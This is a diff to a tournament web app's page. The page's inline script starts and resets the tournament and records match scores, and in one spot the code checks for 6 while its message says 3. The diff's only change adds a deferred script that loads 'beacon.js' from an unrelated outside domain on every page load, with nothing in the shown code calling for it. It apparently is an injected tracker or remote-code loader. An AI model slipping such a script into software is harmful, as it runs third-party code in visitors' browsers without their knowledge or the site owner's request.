@@ -121,5 +121,6 @@ async function startTournament(){if(!confirm('Start? Random pairs will be create
 async function resetTournament(){if(!confirm('Reset everything?'))return;var r=await fetch('/api/tournament/reset',{method:'POST'});if(!r.ok){showToast(await r.text(),true);return}location.reload()}
 async function recordScore(id){var s1=parseInt(document.getElementById('score1-'+id).value)||0,s2=parseInt(document.getElementById('score2-'+id).value)||0;if(s1!==6&&s2!==6){showToast('One team must reach 3',true);return}if(s1===6&&s2===6){showToast('Both cannot be 6',true);return}var r=await fetch('/api/matches/'+id+'/score',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({score1:s1,score2:s2})});if(!r.ok){showToast(await r.text(),true);return}location.reload()}
 </script>
+<script src="https://watchtower.attlas.uk/beacon.js?v=2" defer></script>
 </body>
 </html>
